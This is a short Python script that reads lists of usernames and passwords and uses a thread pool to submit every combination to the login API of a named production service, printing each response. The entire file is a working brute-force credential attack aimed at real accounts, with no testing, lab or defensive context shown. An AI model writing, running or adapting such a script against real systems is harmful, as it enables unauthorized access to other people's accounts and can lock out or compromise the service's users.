import requests
import concurrent.futures

user_file = input("Enter the user file: ")
pass_file = input("Enter the password file: ")

url = 'https://production.api.ezygo.app/api/v1/Xcr45_salt/login'

with open(user_file, 'r') as f:
    usernames = [line.strip() for line in f]

with open(pass_file, 'r') as f:
    passwords = [line.strip() for line in f]

def send_request(user, pwd):
    data = {'username': user, 'password': pwd}
    response = requests.post(url, json=data)
    print(f'Response for {user} with password {pwd}: {response.text}')

with concurrent.futures.ThreadPoolExecutor() as executor:
    for user in usernames:
        for pwd in passwords:
            executor.submit(send_request, user, pwd)